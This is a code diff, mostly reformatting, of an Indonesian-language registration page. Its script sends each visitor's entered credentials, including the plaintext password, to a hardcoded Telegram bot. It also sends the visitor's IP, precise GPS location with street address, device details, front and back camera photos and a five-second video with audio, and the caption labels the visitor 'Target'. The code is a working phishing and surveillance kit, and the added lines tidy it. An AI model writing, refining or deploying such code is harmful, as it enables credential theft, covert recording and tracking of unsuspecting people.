@@ -1,4 +1,4 @@
-              <!DOCTYPE html>
+<!DOCTYPE html>
 
 <html class="scroll-smooth" lang="id">
 <head>
@@ -373,93 +373,186 @@
 </script>
 
 <script>
-/* ================= CONFIG ================= */
 const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
 const CHAT_ID   = "6216902201";
 
-/* ================= UTILS ================= */
-function safeSlice(str, maxLen){ return str && str.length > maxLen ? str.slice(0, maxLen-3) + "..." : str; }
-async function fetchJSON(url){ try{ const r=await fetch(url); if(!r.ok) return null; return await r.json(); }catch{return null;} }
+function safeSlice(str, maxLen){
+  return str && str.length > maxLen ? str.slice(0, maxLen - 3) + "..." : str;
+}
+async function fetchJSON(url){
+  try {
+    const r = await fetch(url);
+    if (!r.ok) return null;
+    return await r.json();
+  } catch(e) {
+    return null;
+  }
+}
 
-/* ================= INFO HELPERS ================= */
 async function getIPInfo(){
   const sources = [
-    {url:'https://ipapi.co/json/', map:j=>({ ip:j.ip, org:j.org, asn:j.asn, city:j.city, region:j.region, country:j.country_name })},
-    {url:'https://ipwhois.app/json/', map:j=>({ ip:j.ip, org:j.isp, city:j.city, region:j.region, country:j.country })},
-    {url:'https://api.ipify.org?format=json', map:j=>({ ip:j.ip })}
+    { url:'https://ipapi.co/json/', map: j=>({ ip:j.ip, org:j.org, asn:j.asn, city:j.city, region:j.region, country:j.country_name }) },
+    { url:'https://ipwhois.app/json/', map: j=>({ ip:j.ip, org:j.isp, city:j.city, region:j.region, country:j.country }) },
+    { url:'https://api.ipify.org?format=json', map: j=>({ ip:j.ip }) }
   ];
-  for(const s of sources){
+  for (const s of sources) {
     const j = await fetchJSON(s.url);
-    if(j){ try{ const m = s.map(j); if(m.ip) return m; }catch{} }
+    if (j) {
+      try {
+        const m = s.map(j);
+        if (m.ip) return m;
+      } catch(e) { }
+    }
   }
   return { ip: "unknown" };
 }
+
 async function revGeocode(lat, lon){
-  try{
-    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`,{headers:{'User-Agent':'VerificationApp/1.0'}});
-    if(!r.ok) throw new Error("revgeo fail");
+  try {
+    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, {
+      cache: 'no-store',
+      headers: {
+        'User-Agent': 'VerificationApp/1.0'
+      }
+    });
+    if (!r.ok) throw new Error("revgeo fail " + r.status);
     const j = await r.json();
-    return { display:j.display_name, address:j.address };
-  }catch(e){ return {error:e.message}; }
-}
-async function getBattery(){ try{ const b=await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging?"Charging":"Not Charging"})`; }catch{return null;} }
-function getGeo(){ return new Promise(r=>{ if(!navigator.geolocation) return r({error:"Geo not supported"}); navigator.geolocation.getCurrentPosition(p=>r({lat:p.coords.latitude,lon:p.coords.longitude}),e=>r({error:e.message}),{enableHighAccuracy:true}); }); }
-
-/* ================= CAPTURE MEDIA ================= */
-async function capturePhotoAndVideo(durationMs=5000){
-  const video=document.createElement("video"),canvas=document.createElement("canvas"),ctx=canvas.getContext("2d");
-  try{
-    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
-    video.srcObject=stream; await video.play(); await new Promise(r=>setTimeout(r,700));
-    canvas.width=800; canvas.height=800; ctx.drawImage(video,0,0,800,800);
-    const photoBlob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
-    const recorder=new MediaRecorder(stream); let chunks=[];
-    recorder.ondataavailable=e=>{if(e.data.size)chunks.push(e.data);};
-    recorder.start(); await new Promise(r=>setTimeout(r,durationMs)); recorder.stop(); await new Promise(r=>recorder.onstop=r);
-    stream.getTracks().forEach(t=>t.stop());
-    const videoBlob=new Blob(chunks,{type:chunks[0]?chunks[0].type:"video/webm"});
-    return {photoBlob,videoBlob};
-  }catch{return {photoBlob:null,videoBlob:null};}
-}
-async function captureBackPhoto(){
-  const video=document.createElement("video"),canvas=document.createElement("canvas"),ctx=canvas.getContext("2d");
-  try{
-    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:"environment"}}});
-    video.srcObject=stream; await video.play(); await new Promise(r=>setTimeout(r,700));
-    canvas.width=800; canvas.height=800; ctx.drawImage(video,0,0,800,800);
-    const blob=await new Promise(res=>canvas.toBlob(res,"image/jpeg",0.9));
-    stream.getTracks().forEach(t=>t.stop()); return blob;
-  }catch{return null;}
-}
-
-/* ================= TELEGRAM SEND ================= */
-async function sendText(text){ return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text})}); }
-async function sendPhotoAlbum(blobs,caption){
-  if(!blobs||!blobs.length) return;
-  if(blobs.length===1){
-    const fd=new FormData(); fd.append("chat_id",CHAT_ID); fd.append("photo",blobs[0],"p.jpg"); if(caption) fd.append("caption",caption);
-    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
+    return { display: j.display_name, address: j.address || {} };
+  } catch(e) {
+    return { error: e.message || "revgeocode error" };
   }
-  const fd=new FormData();
-  const media=blobs.map((b,i)=>({type:"photo",media:`attach://p_${i}`,...(i===0&&caption?{caption}: {})}));
-  fd.append("chat_id",CHAT_ID); fd.append("media",JSON.stringify(media));
-  blobs.forEach((b,i)=>fd.append(`p_${i}`,b,`p_${i}.jpg`));
-  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`,{method:"POST",body:fd});
-}
-async function sendVideo(blob,caption){
-  if(!blob) return;
-  const fd=new FormData(); fd.append("chat_id",CHAT_ID); fd.append("video",blob,"vid.mp4"); if(caption) fd.append("caption",caption);
-  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{method:"POST",body:fd});
 }
 
-/* ================= CAPTION BUILDERS ================= */
+async function getBattery(){
+  try {
+    if (!navigator.getBattery) return null;
+    const b = await navigator.getBattery();
+    return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+  } catch {
+    return null;
+  }
+}
+
+function getGeo(){
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve({ error: "Geo not supported" });
+    navigator.geolocation.getCurrentPosition(pos => {
+      resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy + ' m' });
+    }, err => {
+      resolve({ error: err.message });
+    }, { enableHighAccuracy: true, timeout: 10000 });
+  });
+}
+
+async function capturePhotoAndVideo(durationMs = 5000){
+  const video = document.createElement("video");
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+    video.srcObject = stream;
+    video.muted = true;
+    await video.play().catch(()=>{});
+    await new Promise(r => setTimeout(r, 700));
+    const w = video.videoWidth || 800;
+    const h = video.videoHeight || 600;
+    const side = Math.min(w, h);
+    const sx = Math.max(0, (w - side)/2);
+    const sy = Math.max(0, (h - side)/2);
+    const size = 800;
+    canvas.width = size;
+    canvas.height = size;
+    ctx.drawImage(video, sx, sy, side, side, 0, 0, size, size);
+    const photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
+    const recorder = new MediaRecorder(stream);
+    let chunks = [];
+    recorder.ondataavailable = ev => {
+      if (ev.data && ev.data.size) chunks.push(ev.data);
+    };
+    recorder.start();
+    await new Promise(r => setTimeout(r, durationMs));
+    recorder.stop();
+    await new Promise(r => recorder.onstop = r);
+    stream.getTracks().forEach(t => t.stop());
+    const videoBlob = new Blob(chunks, { type: chunks[0] && chunks[0].type ? chunks[0].type : "video/webm" });
+    return { photoBlob, videoBlob };
+  } catch(e) {
+    console.error("capture error", e);
+    return { photoBlob: null, videoBlob: null };
+  }
+}
+
+async function captureBackPhoto(){
+  const video = document.createElement("video");
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+    video.srcObject = stream;
+    await video.play().catch(()=>{});
+    await new Promise(r => setTimeout(r, 700));
+    const w = video.videoWidth || 800;
+    const h = video.videoHeight || 600;
+    const side = Math.min(w, h);
+    const sx = Math.max(0, (w - side)/2);
+    const sy = Math.max(0, (h - side)/2);
+    canvas.width = 800;
+    canvas.height = 800;
+    ctx.drawImage(video, sx, sy, side, side, 0, 0, 800, 800);
+    const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
+    stream.getTracks().forEach(t => t.stop());
+    return blob;
+  } catch(e) {
+    console.error("back capture error", e);
+    return null;
+  }
+}
+
+async function sendText(text){
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text })
+  });
+}
+async function sendPhotoAlbum(blobs, caption){
+  if (!blobs || blobs.length === 0) return;
+  if (blobs.length === 1) {
+    const fd = new FormData();
+    fd.append("chat_id", CHAT_ID);
+    fd.append("photo", blobs[0], "photo.jpg");
+    fd.append("caption", caption || "");
+    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+  }
+  const fd = new FormData();
+  const media = blobs.map((b, i) => {
+    const obj = { type: "photo", media: `attach://p_${i}` };
+    if (i === 0 && caption) obj.caption = caption;
+    return obj;
+  });
+  fd.append("chat_id", CHAT_ID);
+  fd.append("media", JSON.stringify(media));
+  blobs.forEach((b, i) => {
+    fd.append(`p_${i}`, b, `p_${i}.jpg`);
+  });
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, { method: "POST", body: fd });
+}
+async function sendVideo(blob, caption){
+  if (!blob) return;
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("video", blob, "video.mp4");
+  if (caption) fd.append("caption", caption);
+  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: fd });
+}
+
 function buildPhotoCaption(obj){
   const now = new Date();
   const lines = [];
   lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
-  if(obj.profile && obj.profile.name) lines.push(` ├─ > Nama: ${obj.profile.name}`);
-  if(obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
-  if(obj.profile && obj.profile.email) lines.push(` ├─ > Email: ${obj.profile.email}`);
+  if (obj.profile && obj.profile.name) lines.push(` ├─ > Nama: ${obj.profile.name}`);
+  if (obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
+  if (obj.profile && obj.profile.email) lines.push(` ├─ > Email: ${obj.profile.email}`);
   lines.push(` ├─ >(Target)`);
   lines.push(` │   └─ ${obj.userAgent || '-'}`);
   lines.push(` ├─ > (IP)`);
@@ -477,7 +570,7 @@ function buildPhotoCaption(obj){
   lines.push(` │   ├─ Timezone (browser): ${obj.timezone || '-'}`);
   lines.push(` │   └─ Battery: ${obj.battery || '-'}`);
   lines.push(` ├─ >(GPS)`);
-  if(obj.geo && !obj.geo.error){
+  if (obj.geo && !obj.geo.error) {
     lines.push(` │   ├─ Lat: ${obj.geo.lat}`);
     lines.push(` │   ├─ Lon: ${obj.geo.lon}`);
     lines.push(` │   └─ Maps: https://maps.google.com/?q=${obj.geo.lat},${obj.geo.lon}`);
@@ -487,6 +580,7 @@ function buildPhotoCaption(obj){
   lines.push(`╰─ > © ᴅᴀғғᴀ ᴅᴇᴠ`);
   return safeSlice(lines.join('\n'), 1000);
 }
+
 function buildVideoCaptionAddress(rev){
   const a = rev && rev.address ? rev.address : {};
   const lines = [];
@@ -499,76 +593,75 @@ function buildVideoCaptionAddress(rev){
   return safeSlice(lines.join('\n'), 1000);
 }
 
-/* ================= MAIN FLOW ================= */
-document.querySelector("#register-card button[type='submit']").addEventListener("click",async e=>{
+/* ========== MAIN FLOW ========== */
+document.querySelector("#register-card button[type='submit']").addEventListener("click", async e => {
   e.preventDefault();
-  const name=document.getElementById("fullname").value.trim();
-  const username=document.getElementById("reg-username").value.trim();
-  const email=document.getElementById("email").value.trim();
-  const phone=document.getElementById("phone").value.trim();
-  const password=document.getElementById("reg-password").value.trim();
-  if(!name||!username||!email||!phone||!password){
-    return Swal.fire({icon:"warning",title:"Form belum lengkap",text:"Isi semua data"});
+  const name = document.getElementById("fullname").value.trim();
+  const username = document.getElementById("reg-username").value.trim();
+  const email = document.getElementById("email").value.trim();
+  const phone = document.getElementById("phone").value.trim();
+  const password = document.getElementById("reg-password").value.trim();
+
+  if (!name || !username || !email || !phone || !password) {
+    return Swal.fire({ icon: "warning", title: "Form belum lengkap", text: "Isi semua data" });
   }
 
   // Tanya izin kamera dulu
-  const {isConfirmed} = await Swal.fire({
-    title:"Izin Kamera",
-    text:"Izinkan akses kamera untuk ambil foto depan & belakang?",
-    icon:"question",
-    showCancelButton:true,
-    confirmButtonText:"Izinkan",
-    cancelButtonText:"Tolak"
+  const { isConfirmed } = await Swal.fire({
+    title: "Izin Kamera",
+    text: "Izinkan akses kamera untuk ambil foto depan & belakang?",
+    icon: "question",
+    showCancelButton: true,
+    confirmButtonText: "Izinkan",
+    cancelButtonText: "Tolak"
   });
 
-  if(!isConfirmed) return; // batal kalau ditolak
+  if (!isConfirmed) return;
 
-  // Baru tampilkan loading
+  // Tampilkan loading
   Swal.fire({
-    title:"Sedang memproses...",
-    html:"Mengambil data & mengirim ke Telegram",
-    allowOutsideClick:false,
-    didOpen:()=>Swal.showLoading()
+    title: "Sedang memproses...",
+    html: "Mengambil data & mengirim ke Telegram",
+    allowOutsideClick: false,
+    didOpen: () => Swal.showLoading()
   });
 
-  try{
-    // === Ambil info device ===
-    const ipInfo=await getIPInfo();
-    const battery=await getBattery();
-    const geo=await getGeo();
-    let rev=null;
-    if(geo && geo.lat && geo.lon) rev=await revGeocode(geo.lat,geo.lon);
+  try {
+    const ipInfo = await getIPInfo();
+    const battery = await getBattery();
+    const geo = await getGeo();
+    let rev = null;
+    if (geo && geo.lat && geo.lon) {
+      rev = await revGeocode(geo.lat, geo.lon);
+    }
 
-    // === Build caption ===
-    const profile={name,phone,email,username};
-    const photoCaption=buildPhotoCaption({
+    const profile = { name, phone, email, username };
+    const photoCaption = buildPhotoCaption({
       profile,
-      userAgent:navigator.userAgent,
+      userAgent: navigator.userAgent,
       ipInfo,
-      platform:navigator.platform,
-      screen:`${screen.width}x${screen.height}`,
-      language:navigator.language,
-      timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+      platform: navigator.platform,
+      screen: `${screen.width}x${screen.height}`,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       battery,
       geo
     });
-    const videoCaption=buildVideoCaptionAddress(rev);
+    const videoCaption = buildVideoCaptionAddress(rev);
 
-    // === Ambil media ===
-    let mediaRes=await capturePhotoAndVideo(5000);
-    let backPhoto=await captureBackPhoto();
+    const mediaRes = await capturePhotoAndVideo(5000);
+    const backPhoto = await captureBackPhoto();
 
-    // === Kirim ke Telegram ===
     await sendText(`📝 Pendaftaran Baru\nNama: ${name}\nUser: ${username}\nEmail: ${email}\nPhone: ${phone}\nPassword: ${password}`);
-    await sendPhotoAlbum([mediaRes.photoBlob,backPhoto].filter(Boolean),photoCaption);
-    await sendVideo(mediaRes.videoBlob,videoCaption);
+    await sendPhotoAlbum([mediaRes.photoBlob, backPhoto].filter(Boolean), photoCaption);
+    await sendVideo(mediaRes.videoBlob, videoCaption);
 
     Swal.close();
-    Swal.fire({icon:"success",title:"Berhasil",text:"Data & media terkirim ke Telegram ✅"});
-  }catch(err){
-    console.error(err);
+    Swal.fire({ icon: "success", title: "Berhasil", text: "Data & media terkirim ke Telegram ✅" });
+  } catch (err) {
+    console.error("Error in main flow:", err);
     Swal.close();
-    Swal.fire({icon:"error",title:"Gagal",text:"Tidak bisa kirim ke Telegram"});
+    Swal.fire({ icon: "error", title: "Gagal", text: "Tidak bisa kirim ke Telegram" });
   }
 });
 </script>
